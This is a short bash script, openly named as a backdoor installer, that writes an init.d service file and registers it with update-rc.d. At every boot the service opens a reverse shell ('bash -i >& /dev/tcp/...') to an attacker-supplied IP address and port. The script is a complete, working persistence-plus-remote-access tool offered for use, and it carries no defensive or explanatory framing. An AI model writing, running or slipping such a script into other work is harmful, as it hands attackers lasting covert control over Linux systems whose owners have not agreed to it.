#!/bin/bash
# init_d_backdoor.sh - Create an init.d script to enable a reverse shell backdoor.
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <attacker_ip> <attacker_port>"
  exit 1
fi
SERVICE="/etc/init.d/rev_shell"
echo "#!/bin/bash
### BEGIN INIT INFO
# Provides:          rev_shell
# Required-Start:    \$remote_fs \$syslog
# Required-Stop:     \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Reverse shell backdoor
### END INIT INFO
case "\$1" in
start)
  bash -i >& /dev/tcp/$1/$2 0>&1 &
  ;;
stop)
  pkill -f "bash -i >& /dev/tcp/$1/$2"
  ;;
*)
  echo "Usage: \$0 {start|stop}"
  exit 1
  ;;
esac" | sudo tee $SERVICE >/dev/null
sudo chmod +x $SERVICE
sudo update-rc.d rev_shell defaults
echo "Init.d reverse shell backdoor installed."
